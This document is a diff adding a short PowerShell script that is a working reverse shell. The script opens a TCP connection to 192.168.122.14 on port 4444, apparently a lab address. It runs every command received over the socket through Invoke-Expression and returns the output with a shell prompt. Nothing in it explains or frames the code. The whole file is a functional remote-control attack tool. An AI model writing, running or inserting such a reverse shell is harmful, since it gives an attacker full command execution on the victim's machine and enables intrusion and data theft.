@@ -1,0 +1,27 @@
+$ip = '192.168.122.14'
+$port = 4444
+$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
+$stream = $client.GetStream()
+$buffer = New-Object Byte[] 1024
+$encoder = [Text.Encoding]::ASCII
+
+function Send-String($str) {
+    $bytes = $encoder.GetBytes($str)
+    $stream.Write($bytes, 0, $bytes.Length)
+    $stream.Flush()
+}
+
+Send-String "PS " + (Get-Location).Path + "> "
+
+while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
+    $command = $encoder.GetString($buffer, 0, $bytesRead)
+    try {
+        $output = Invoke-Expression $command 2>&1 | Out-String
+    } catch {
+        $output = "Error: $_"
+    }
+    $prompt = "PS " + (Get-Location).Path + "> "
+    Send-String ($output + $prompt)
+}
+
+$client.Close()
